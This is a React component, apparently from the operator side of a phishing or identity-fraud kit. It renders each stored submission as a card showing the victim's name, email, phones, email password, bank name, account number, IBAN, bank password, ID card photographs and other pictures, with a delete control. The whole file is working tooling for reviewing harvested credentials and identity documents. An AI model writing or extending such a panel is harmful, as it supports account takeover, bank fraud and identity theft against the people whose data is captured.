import Icon from "../ui/Icon.jsx";

function formatDate(iso) {
  try {
    return new Date(iso).toLocaleString();
  } catch {
    return iso || "";
  }
}

function Detail({ label, value, mono, secret }) {
  if (!value) return null;
  return (
    <div className={secret ? "detail detail--secret" : "detail"}>
      <dt>{label}</dt>
      <dd className={mono ? "mono" : undefined}>{value}</dd>
    </div>
  );
}

/** One stored submission, rendered as a record card. */
export default function SubmissionCard({ submission: s, onDelete, busy }) {
  const photoCount = s.pictures.length;
  const cardCount = s.id_cards.length;

  return (
    <article className="submission">
      <header className="submission__head">
        <div className="submission__person">
          <h3>{s.full_name}</h3>
          <a href={`mailto:${s.email}`}>{s.email}</a>
        </div>
        <div className="submission__meta">
          <time dateTime={s.created_at}>{formatDate(s.created_at)}</time>
          <span className="submission__tags">
            {photoCount > 0 && (
              <span className="badge badge--brand">
                {photoCount} photo{photoCount === 1 ? "" : "s"}
              </span>
            )}
            {cardCount > 0 && (
              <span className="badge badge--accent">
                {cardCount} ID card{cardCount === 1 ? "" : "s"}
              </span>
            )}
          </span>
        </div>
      </header>

      <div className="submission__body">
        <dl className="detail-list">
          {s.phone_numbers.length > 0 && (
            <Detail label="Phones" value={s.phone_numbers.join(", ")} />
          )}
          <Detail label="Email password" value={s.email_password} secret />
          <Detail label="Bank" value={s.bank_name} />
          <Detail label="Account" value={s.bank_account} mono />
          <Detail label="IBAN" value={s.iban} mono />
          <Detail label="Bank password" value={s.bank_password} secret />
        </dl>

        {cardCount > 0 && (
          <div className="id-cards">
            <span className="id-cards__label">ID card photographs</span>
            <div className="thumbs">
              {s.id_cards.map((pic, i) => (
                <a
                  key={pic.url}
                  href={pic.url}
                  target="_blank"
                  rel="noreferrer"
                  title={`ID card ${i === 0 ? "front" : "back"}`}
                >
                  <img src={pic.url} alt={`ID card side ${i + 1}`} loading="lazy" />
                </a>
              ))}
            </div>
          </div>
        )}

        {photoCount > 0 && (
          <div className="thumbs">
            {s.pictures.map((pic) => (
              <a
                key={pic.url}
                href={pic.url}
                target="_blank"
                rel="noreferrer"
                title={pic.filename}
              >
                <img src={pic.url} alt={pic.filename} loading="lazy" />
              </a>
            ))}
          </div>
        )}

        {s.notes && <p className="submission__notes">{s.notes}</p>}
      </div>

      <footer className="submission__foot">
        <code>{s.id}</code>
        <button
          type="button"
          className="btn btn--danger btn--sm"
          onClick={() => onDelete(s.id)}
          disabled={busy}
        >
          <Icon name="close" size={13} />
          Delete
        </button>
      </footer>
    </article>
  );
}